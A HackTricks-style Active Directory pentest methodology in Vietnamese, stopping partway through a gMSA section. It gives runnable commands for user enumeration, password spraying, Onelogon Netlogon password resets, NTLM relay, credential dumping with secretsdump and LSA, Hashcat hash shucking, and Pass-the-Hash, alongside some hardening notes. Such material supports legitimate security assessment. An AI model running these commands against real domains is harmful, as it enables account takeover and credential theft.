# Phương pháp luận Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Tổng quan cơ bản

**Active Directory** là công nghệ nền tảng, giúp **quản trị viên mạng** tạo và quản lý hiệu quả **domain**, **người dùng** và **đối tượng** trong mạng. Công nghệ này được thiết kế để mở rộng quy mô, cho phép tổ chức số lượng lớn người dùng thành các **nhóm** và **nhóm con** dễ quản lý, đồng thời kiểm soát **quyền truy cập** ở nhiều cấp độ.

Cấu trúc của **Active Directory** gồm ba lớp chính: **domain**, **cây** và **forest**. Một **domain** bao gồm tập hợp các đối tượng, chẳng hạn như **người dùng** hoặc **thiết bị**, dùng chung một cơ sở dữ liệu. **Cây** là tập hợp các domain được liên kết với nhau bằng cấu trúc chung, còn **forest** là tập hợp nhiều cây, được kết nối thông qua **quan hệ tin cậy**, tạo thành lớp cao nhất trong cấu trúc tổ chức. Có thể chỉ định **quyền truy cập** và **quyền giao tiếp** cụ thể ở mỗi cấp này.

Các khái niệm chính trong **Active Directory** gồm:

1. **Thư mục** – Lưu trữ mọi thông tin liên quan đến các đối tượng Active Directory.
2. **Đối tượng** – Chỉ các thực thể trong thư mục, bao gồm **người dùng**, **nhóm** hoặc **thư mục dùng chung**.
3. **Domain** – Là vùng chứa các đối tượng thư mục; nhiều domain có thể cùng tồn tại trong một **forest**, mỗi domain duy trì tập hợp đối tượng riêng.
4. **Cây** – Tập hợp các domain dùng chung một domain gốc.
5. **Forest** – Cấp cao nhất trong cấu trúc tổ chức của Active Directory, gồm nhiều cây có **quan hệ tin cậy** với nhau.

**Active Directory Domain Services (AD DS)** bao gồm nhiều dịch vụ thiết yếu cho việc quản lý tập trung và giao tiếp trong mạng. Các dịch vụ này gồm:

1. **Dịch vụ Domain** – Tập trung lưu trữ dữ liệu và quản lý tương tác giữa **người dùng** và **domain**, bao gồm các chức năng **xác thực** và **tìm kiếm**.
2. **Dịch vụ Chứng chỉ** – Quản lý việc tạo, phân phối và quản trị **chứng chỉ số** bảo mật.
3. **Dịch vụ Thư mục Rút gọn** – Hỗ trợ các ứng dụng có khả năng tích hợp thư mục thông qua **giao thức LDAP**.
4. **Dịch vụ Liên kết Thư mục** – Cung cấp khả năng **đăng nhập một lần** để xác thực người dùng trên nhiều ứng dụng web trong một phiên.
5. **Quản lý Quyền** – Giúp bảo vệ tài liệu có bản quyền bằng cách kiểm soát việc phân phối và sử dụng trái phép.
6. **Dịch vụ DNS** – Có vai trò thiết yếu trong việc phân giải **tên domain**.

Để tìm hiểu chi tiết hơn, hãy xem: [**TechTerms - Định nghĩa Active Directory**](https://techterms.com/definition/active_directory)

### **Xác thực Kerberos**

Để biết cách **tấn công AD**, bạn cần **hiểu rõ** quy trình **xác thực Kerberos**.\
[**Đọc trang này nếu bạn vẫn chưa biết cách thức hoạt động của nó.**](kerberos-authentication.md)

## Cheat Sheet

Bạn có thể truy cập [https://wadcoms.github.io/](https://wadcoms.github.io) để xem nhanh các lệnh có thể chạy nhằm liệt kê/khai thác AD.

> [!WARNING]
> Giao tiếp Kerberos thường **yêu cầu tên domain đầy đủ (FQDN)** để máy khách có thể lấy ticket cho SPN chính xác. Khi truy cập máy bằng địa chỉ IP, kết nối thường chuyển sang dùng NTLM thay vì Kerberos.

## Trinh sát Active Directory (Không có thông tin xác thực/phiên)

Nếu bạn chỉ có quyền truy cập vào môi trường AD nhưng không có thông tin xác thực/phiên, bạn có thể:

- **Pentest mạng:**
  - Quét mạng, tìm máy và cổng đang mở, rồi thử **khai thác lỗ hổng** hoặc **trích xuất thông tin xác thực** từ chúng (ví dụ: [máy in có thể là mục tiêu rất đáng chú ý](ad-information-in-printers.md)).
  - Liệt kê DNS có thể cung cấp thông tin về các máy chủ quan trọng trong domain, chẳng hạn như web, máy in, share, vpn, media, v.v.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Xem [**Phương pháp luận Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) tổng quát để biết thêm thông tin về cách thực hiện việc này.
- **Kiểm tra quyền truy cập null và Guest trên các dịch vụ smb** (cách này sẽ không hoạt động trên các phiên bản Windows hiện đại):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Có thể xem hướng dẫn chi tiết hơn về cách liệt kê máy chủ SMB tại đây:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Liệt kê LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Có thể xem hướng dẫn chi tiết hơn về cách liệt kê LDAP tại đây (hãy **đặc biệt chú ý đến quyền truy cập ẩn danh**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Đầu độc mạng**
  - Thu thập thông tin xác thực bằng cách [**giả mạo dịch vụ với Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Truy cập máy chủ bằng cách [**lạm dụng relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Thu thập thông tin xác thực bằng cách **phơi lộ** [**dịch vụ UPnP giả với evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Trích xuất tên người dùng/tên từ tài liệu nội bộ, mạng xã hội, dịch vụ (chủ yếu là web) trong môi trường domain, cũng như từ các nguồn công khai.
  - Nếu tìm được họ tên đầy đủ của nhân viên công ty, bạn có thể thử các **quy ước đặt tên người dùng** AD khác nhau (**[đọc nội dung này](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Các quy ước phổ biến nhất là: _TênHọ_, _Tên.Họ_, _TênHọ_ (3 chữ cái mỗi phần), _Tên.Họ_, _CTênHọ_, _C.Họ_, _HọTên_, _Họ.Tên_, _HọC_, _Họ.C_, 3 _chữ cái ngẫu nhiên và 3 chữ số ngẫu nhiên_ (abc123).
  - Công cụ:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Liệt kê người dùng

- **Liệt kê SMB/LDAP ẩn danh:** Xem các trang [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) và [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Liệt kê bằng Kerbrute**: Khi **yêu cầu tên người dùng không hợp lệ**, máy chủ sẽ phản hồi bằng mã lỗi **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, cho phép chúng ta xác định tên người dùng không hợp lệ. Với **tên người dùng hợp lệ**, máy chủ sẽ trả về **TGT trong phản hồi AS-REP** hoặc lỗi _KRB5KDC_ERR_PREAUTH_REQUIRED_, cho biết người dùng cần thực hiện pre-authentication.
- **Không xác thực với MS-NRPC**: Sử dụng auth-level = 1 (Không xác thực) với giao diện MS-NRPC (Netlogon) trên domain controller. Phương thức này gọi hàm `DsrGetDcNameEx2` sau khi bind giao diện MS-NRPC để kiểm tra xem người dùng hoặc máy tính có tồn tại hay không mà không cần thông tin xác thực. Công cụ [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) triển khai kiểu liệt kê này. Nghiên cứu có thể xem [tại đây](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Nếu bạn tìm thấy một trong các server này trong mạng, bạn cũng có thể thực hiện **user enumeration** trên đó. Ví dụ, bạn có thể sử dụng công cụ [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Bạn có thể tìm thấy danh sách tên người dùng trong [**repo github này**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) và repo này ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuy nhiên, bạn nên có **tên những người làm việc tại công ty** từ bước recon mà bạn đáng lẽ đã thực hiện trước đó. Với tên và họ, bạn có thể dùng script [**namemash.py**](https://gist.github.com/superkojiman/11076951) để tạo các tên người dùng hợp lệ tiềm năng.

### Lạm dụng danh sách cho phép kênh Netlogon dễ bị tấn công (Onelogon)

Ngay cả khi **Zerologon** đã được vá trên DC, các tài khoản được đưa vào danh sách cho phép rõ ràng vẫn có thể bị lộ trước **hành vi kênh bảo mật Netlogon cũ/dễ bị tấn công**. Cấu hình rủi ro là GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** hoặc giá trị registry tương ứng **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Giá trị này là một **security descriptor SDDL** (xem [Security Descriptors](security-descriptors.md)). Bất kỳ tài khoản hoặc nhóm nào được cấp ACE phù hợp trong DACL đều có thể bị nhắm mục tiêu. Ví dụ, `O:BAG:BAD:(A;;RC;;;WD)` trên thực tế đưa **Everyone** vào danh sách cho phép.

Quy trình thực tế cho operator:

1. **Xác định các principal trong danh sách cho phép** bằng cách kiểm tra cả **SYSVOL/GPO** lẫn **registry trực tiếp trên DC**.
2. **Phân giải SID** có trong SDDL thành người dùng/máy tính AD thực tế và ưu tiên **tài khoản máy DC**, **tài khoản trust** và các máy có đặc quyền khác.
3. Liên tục thử **xác thực MS-NRPC / Netlogon** bằng tài khoản được cho phép.
4. Sau khi đoán đúng, lạm dụng **thiết lập mật khẩu Netlogon** để đặt lại mật khẩu tài khoản mục tiêu (PoC công khai đặt mật khẩu thành chuỗi rỗng).<sup>[[9]](#references)[[10]](#references)</sup>

Ví dụ triage nhanh / lab từ artifact công khai:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Ghi chú:

- **scanner** hữu ích vì allow-list hiệu lực có thể nằm trong **SYSVOL**, **registry** hoặc cả hai.
- Bản thân đường khai thác rất quan trọng vì **không yêu cầu đặc quyền Domain Admin** sau khi đã xác định được tài khoản dễ bị tấn công.
- Chiếm được **tài khoản máy của Domain Controller**, chẳng hạn như `DC$`, đặc biệt nguy hiểm vì đặt lại mật khẩu của tài khoản đó có thể trực tiếp mở ra các con đường **chiếm quyền AD** rộng hơn.
- **Tính khả thi của brute-force** phụ thuộc vào chế độ: artifact công khai mô tả phương pháp meet-in-the-middle, brute-force **24-bit** khi có một tài khoản máy tính khác và các biến thể **32-bit** chậm hơn.

Ghi chú về phát hiện / hardening:

- Kiểm tra chính sách allow-list và loại bỏ mọi mục, ngoại trừ các ngoại lệ tương thích tạm thời được yêu cầu rõ ràng.
- Giám sát các sự kiện **5827/5828/5829/5830/5831** trong **System** trên DC để phát hiện các kết nối Netlogon dễ bị tấn công bị từ chối, được phát hiện hoặc được chính sách cho phép rõ ràng.
- Coi các tài khoản trong `VulnerableChannelAllowList` là **rủi ro cao** cho đến khi loại bỏ được dependency cũ.

### Biết một hay nhiều username

Được rồi, vậy là bạn biết mình đã có username hợp lệ nhưng chưa có mật khẩu... Vậy hãy thử:

- [**ASREPRoast**](asreproast.md): Nếu người dùng **không có** thuộc tính _DONT_REQ_PREAUTH_, bạn có thể **yêu cầu một thông điệp AS_REP** cho người dùng đó; thông điệp này chứa dữ liệu được mã hóa bằng một giá trị dẫn xuất từ mật khẩu của người dùng.
- [**Password Spraying**](password-spraying.md): Hãy thử các **mật khẩu phổ biến nhất** với từng người dùng đã tìm thấy; có thể có người dùng đang sử dụng mật khẩu yếu (hãy nhớ đến chính sách mật khẩu!).
  - Lưu ý rằng bạn cũng có thể **spray các máy chủ OWA** để thử truy cập vào mail server của người dùng.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Bạn có thể **thu thập** một số **hash** challenge để crack bằng cách **poisoning** một số protocol của **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration cung cấp username, định danh email và quy luật đặt tên, các host tiềm năng cùng những service có thể bị ép xác thực. Dùng thông tin đó để xác định các [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM khả thi và các đường xâm nhập tiềm năng vào môi trường AD.

### Recon dựa trên workspace của NetExec & kiểm tra trạng thái relay

- Dùng **workspace `nxcdb`** để lưu trạng thái recon AD riêng cho từng engagement: `workspace create <name>` tạo các DB SQLite riêng cho từng protocol tại `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Chuyển chế độ xem bằng `proto smb|mssql|winrm` và liệt kê các secret đã thu thập bằng `creds`. Khi hoàn tất, hãy tự xóa dữ liệu nhạy cảm: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Khám phá subnet nhanh bằng **`netexec smb <cidr>`** sẽ hiển thị **domain**, **OS build**, **yêu cầu SMB signing** và **Null Auth**. Các máy thành viên hiển thị `(signing:False)` dễ bị **relay**, trong khi DC thường yêu cầu signing.
- Tạo **hostname trong /etc/hosts** trực tiếp từ output của NetExec để dễ nhắm mục tiêu:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Khi **SMB relay tới DC bị chặn** do yêu cầu signing, vẫn kiểm tra cấu hình bảo mật **LDAP**: `netexec ldap <dc>` làm nổi bật `(signing:None)` / channel binding yếu. DC yêu cầu SMB signing nhưng tắt LDAP signing vẫn là mục tiêu khả thi để **relay-to-LDAP** và thực hiện các kiểu tấn công như **SPN-less RBCD**.

### Rò rỉ credential từ giao diện máy in phía client → xác thực hàng loạt credential domain

- Giao diện web/máy in đôi khi **nhúng mật khẩu admin đã bị che trong HTML**. Xem source/devtools có thể làm lộ cleartext (ví dụ: `<input value="<password>">`), cho phép truy cập bằng Basic-auth vào các kho lưu trữ scan/print.
- Các print job được lấy về có thể chứa **tài liệu onboarding dạng plaintext** với mật khẩu riêng của từng user. Hãy giữ đúng từng cặp khi kiểm tra:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Đánh cắp thông tin xác thực NTLM

Nếu bạn có thể **truy cập các PC hoặc share khác** bằng **người dùng null hoặc guest**, bạn có thể **đặt các tệp** (chẳng hạn như tệp SCF) mà nếu ai đó truy cập, chúng sẽ **kích hoạt xác thực NTLM với bạn**, giúp bạn **đánh cắp** **NTLM challenge** để bẻ khóa:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** xem mọi NT hash bạn đã có là một mật khẩu ứng viên cho các định dạng chậm hơn khác, vốn có key material được suy ra trực tiếp từ NT hash. Thay vì brute-force các passphrase dài trong Kerberos RC4 ticket, NetNTLM challenge hoặc cached credential, bạn đưa các NT hash vào các chế độ NT-candidate của Hashcat để kiểm tra việc tái sử dụng mật khẩu mà không cần biết plaintext. Kỹ thuật này đặc biệt hiệu quả sau khi chiếm quyền domain, khi bạn có thể thu thập hàng nghìn NT hash hiện tại và trong quá khứ.<sup>[[5]](#references)</sup>

Dùng shucking khi:

- Bạn có một tập hợp NT hash từ DCSync, bản dump SAM/SECURITY hoặc kho credential và cần kiểm tra việc tái sử dụng trong các domain/forest khác.
- Bạn thu thập được dữ liệu Kerberos dựa trên RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), phản hồi NetNTLM hoặc blob DCC/DCC2.
- Bạn muốn nhanh chóng chứng minh việc tái sử dụng các passphrase dài, không thể bẻ khóa và ngay lập tức pivot bằng Pass-the-Hash.

Kỹ thuật này **không hoạt động** với các loại mã hóa có key không phải là NT hash (ví dụ: Kerberos etype 17/18 AES). Nếu domain chỉ cho phép AES, bạn phải quay lại các chế độ mật khẩu thông thường.

#### Xây dựng tập hợp NT hash

- **DCSync/NTDS** – Dùng `secretsdump.py` cùng với history để lấy tập NT hash lớn nhất có thể (bao gồm cả các giá trị trước đó):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Các mục lịch sử mở rộng đáng kể tập ứng viên vì Microsoft có thể lưu trữ tối đa 24 hash trước đó cho mỗi tài khoản. Để biết thêm cách thu thập bí mật NTDS, xem:

{{#ref}}
dcsync.md
{{#endref}}

- **Dump cache trên endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (hoặc Mimikatz `lsadump::sam /patch`) trích xuất dữ liệu SAM/SECURITY cục bộ và thông tin đăng nhập domain đã lưu trong cache (DCC/DCC2). Loại bỏ trùng lặp rồi thêm các hash đó vào cùng danh sách `nt_candidates.txt`.
- **Theo dõi metadata** – Lưu username/domain đã tạo ra mỗi hash (ngay cả khi wordlist chỉ chứa giá trị hex). Hash khớp sẽ cho bạn biết ngay principal nào đang tái sử dụng mật khẩu khi Hashcat in ra candidate thành công.
- Ưu tiên các candidate từ cùng forest hoặc một forest đáng tin cậy; điều đó tối đa hóa khả năng trùng khớp khi shucking.

#### Các mode NT-candidate của Hashcat

| Loại hash                               | Mode mật khẩu | Mode NT-candidate |
| --------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)         | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)      | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS               | 5500          | 27000             |
| NetNTLMv2                               | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth     | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP              | 18200         | 35400             |

Ghi chú:

- Đầu vào NT-candidate **phải luôn là NT hash thô gồm 32 ký tự hex**. Tắt các rule engine (không dùng `-r`, không dùng hybrid mode) vì việc biến đổi sẽ làm hỏng key material của candidate.
- Các mode này vốn không nhanh hơn, nhưng keyspace NTLM (~30,000 MH/s trên M3 Max) nhanh hơn khoảng 100 lần so với Kerberos RC4 (~300 MH/s). Kiểm tra một danh sách NT được tuyển chọn sẽ ít tốn kém hơn nhiều so với việc dò toàn bộ không gian mật khẩu ở định dạng chậm.
- Luôn chạy **bản Hashcat mới nhất** (`git clone https://github.com/hashcat/hashcat && make install`) vì các mode 31500/31600/35300/35400 mới được phát hành gần đây.<sup>[[7]](#references)</sup>
- Hiện chưa có NT mode cho AS-REQ Pre-Auth, và các etype AES (19600/19700) yêu cầu mật khẩu rõ vì khóa của chúng được tạo qua PBKDF2 từ mật khẩu UTF-16LE, không phải từ NT hash thô.

#### Ví dụ – Kerberoast RC4 (mode 35300)

1. Thu thập RC4 TGS cho một SPN mục tiêu bằng tài khoản người dùng có đặc quyền thấp (xem trang Kerberoast để biết chi tiết):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck ticket bằng NT list của bạn:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat suy ra khóa RC4 từ từng NT candidate và xác minh blob `$krb5tgs$23$...`. Kết quả khớp xác nhận rằng tài khoản dịch vụ sử dụng một trong các NT hash hiện có của bạn.

3. Pivot ngay bằng PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Bạn có thể khôi phục plaintext sau đó bằng `hashcat -m 1000 <matched_hash> wordlists/` nếu cần.

#### Ví dụ – Thông tin đăng nhập đã lưu trong bộ nhớ đệm (mode 31600)

1. Dump các lần đăng nhập đã lưu trong bộ nhớ đệm từ một máy trạm bị xâm nhập:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Sao chép dòng DCC2 của người dùng domain đáng chú ý vào `dcc2_highpriv.txt` rồi shuck nó:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Kết quả khớp thành công sẽ cho ra NT hash đã có trong danh sách của bạn, chứng minh rằng người dùng được cache đang dùng lại mật khẩu. Dùng trực tiếp hash đó cho PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) hoặc brute-force ở chế độ NTLM nhanh để khôi phục chuỗi mật khẩu.

Quy trình tương tự áp dụng cho challenge-response NetNTLM (`-m 27000/27100`) và DCC (`-m 31500`). Khi tìm được kết quả khớp, bạn có thể thực hiện relay, PtH qua SMB/WMI/WinRM hoặc crack lại NT hash ngoại tuyến bằng masks/rules.



## Liệt kê Active Directory CÓ thông tin xác thực/phiên

Trong giai đoạn này, bạn cần **đã xâm phạm được thông tin xác thực hoặc phiên của một tài khoản domain hợp lệ.** Nếu bạn có thông tin xác thực hợp lệ hoặc shell với tư cách người dùng domain, **hãy nhớ rằng các tùy chọn đã nêu trước đó vẫn có thể được dùng để xâm phạm các người dùng khác**.

Trước khi bắt đầu liệt kê có xác thực, hãy tìm hiểu **vấn đề Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Liệt kê

Xâm phạm được một tài khoản là **bước tiến lớn trong việc đánh giá domain**, vì điều đó cho phép **liệt kê Active Directory** có xác thực:

Về [**ASREPRoast**](asreproast.md), giờ đây bạn có thể tìm tất cả người dùng có khả năng bị tấn công; còn với [**Password Spraying**](password-spraying.md), bạn có thể lấy **danh sách tất cả username** và thử mật khẩu của tài khoản đã xâm phạm, mật khẩu trống và các mật khẩu mới có tiềm năng.

- Bạn có thể dùng [**CMD để thực hiện recon cơ bản**](../basic-cmd-for-pentesters.md#domain-info)
- Bạn cũng có thể dùng [**powershell để recon**](../basic-powershell-for-pentesters/index.html), cách này sẽ kín đáo hơn
- Bạn cũng có thể [**dùng powerview**](../basic-powershell-for-pentesters/powerview.md) để trích xuất thông tin chi tiết hơn
- Một công cụ recon tuyệt vời khác cho Active Directory là [**BloodHound**](bloodhound.md). Công cụ này **không kín đáo lắm** (tùy thuộc vào phương thức thu thập bạn dùng), nhưng **nếu bạn không quan tâm** đến điều đó thì nhất định nên thử. Tìm nơi người dùng có thể RDP, tìm đường dẫn đến các nhóm khác, v.v.
  - **Các công cụ tự động khác để liệt kê AD gồm:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Các bản ghi DNS của AD**](ad-dns-records.md) có thể chứa thông tin đáng chú ý.
- Một **công cụ có GUI** mà bạn có thể dùng để liệt kê directory là **AdExplorer.exe** trong bộ **SysInternal** Suite.
- Bạn cũng có thể tìm kiếm trong cơ sở dữ liệu LDAP bằng **ldapsearch** để tìm thông tin xác thực trong các trường _userPassword_ và _unixUserPassword_, hoặc trong ghi chú _description_ và _info_ của người dùng. Một chuỗi có dạng mật khẩu nhưng không được gắn nhãn trong _info_ chỉ là một ứng viên: hãy xác nhận riêng mục đích và tính hợp lệ của nó, đồng thời không đưa nội dung ghi chú vào đầu ra liệt kê thông thường. Xem [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) để biết các phương pháp khác.
- Khi được cấp quyền, hãy xem lại các script đăng nhập domain và ánh xạ ổ đĩa **có thể truy cập** trong `\\<dc>\NETLOGON` hoặc `\\<dc>\SYSVOL\<domain>\scripts`. [Microsoft có tài liệu](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) về vai trò của thư mục script trong share NETLOGON. Trước tiên, hãy liệt kê tên, sau đó chỉ kiểm tra các script liên quan, có thể đọc được và nằm trong giới hạn kích thước; không dump toàn bộ share hoặc hiển thị giá trị thông tin xác thực trong quá trình liệt kê thông thường. Một lệnh gọi PowerShell đến [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **không** bảo vệ mật khẩu dạng literal được lưu trong script. Chỉ riêng lệnh gọi đó không chứng minh rằng một bí mật được hardcode: hãy truy vết đầu vào thực tế, rồi xác minh riêng tài khoản, tính hợp lệ của thông tin xác thực và các quyền. Việc xem script domain trong share từ xa là một hoạt động riêng, không thuộc quá trình liệt kê máy chủ cục bộ.
- Nếu đang dùng **Linux**, bạn cũng có thể liệt kê domain bằng [**pywerview**](https://github.com/the-useless-one/pywerview).
- Bạn cũng có thể thử các công cụ tự động như:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Trích xuất tất cả người dùng domain**

  Rất dễ lấy toàn bộ username trong domain từ Windows (`net user /domain` ,`Get-DomainUser` hoặc `wmic useraccount get name,sid`). Trên Linux, bạn có thể dùng: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` hoặc `enum4linux -a -u "user" -p "password" <DC IP>`

> Dù phần liệt kê này có vẻ ngắn, đây là phần quan trọng nhất. Hãy truy cập các liên kết (chủ yếu là các mục về cmd, powershell, powerview và BloodHound), tìm hiểu cách liệt kê domain và thực hành cho đến khi thành thạo. Trong quá trình đánh giá, đây sẽ là thời điểm then chốt để tìm đường trở thành DA hoặc quyết định rằng không thể làm gì thêm.

### Tài khoản máy tính được tạo sẵn có mật khẩu dễ đoán -> truy cập mật khẩu gMSA

Các tài khoản máy tính được tạo sẵn cho quy trình tham gia domain cũ có thể giữ lại mật khẩu ban đầu dễ đoán. Module `pre2k` của NetExec xác định giá trị `userAccountControl` đặc trưng là `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) và thử lấy Kerberos TGT bằng 14 ký tự đầu tiên của tên máy tính viết thường, bỏ dấu `$` ở cuối. Hãy xem giá trị UAC này là tiêu chí chọn ứng viên, thay vì cho rằng chỉ riêng việc thuộc nhóm **Pre-Windows 2000 Compatible Access** đã chứng minh mật khẩu yếu.<sup>[[18]](#references)[[20]](#references)</sup>

Dùng LDAP enumeration có xác thực để kiểm tra các ứng viên và lưu lại những TGT lấy được thành công. `ALL=True` mở rộng phạm vi kiểm tra sang cả các đối tượng không khớp bộ lọc mặc định `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Một bind mặc định/NTLM thất bại **không** làm mất hiệu lực phát hiện này: hãy kiểm tra bằng `-k`, một FQDN phân giải thành DC và đồng hồ được đồng bộ với KDC. Các lần chạy module thành công ghi danh sách ứng viên và ccaches thu được bên dưới `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Sau khi chiếm được computer principal, hãy lập đồ thị các nhóm lồng nhau mà principal này là thành viên và các quyền outbound của nó. Cụ thể, các principal được nêu trong security descriptor `msDS-GroupMSAMembership` của gMSA có thể đọc `msDS-ManagedPassword`; đầu ra `--gmsa` của NetExec hiển thị các principal được phép và trả về NT hash hiện tại nếu computer dùng để xác thực được cấp quyền.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
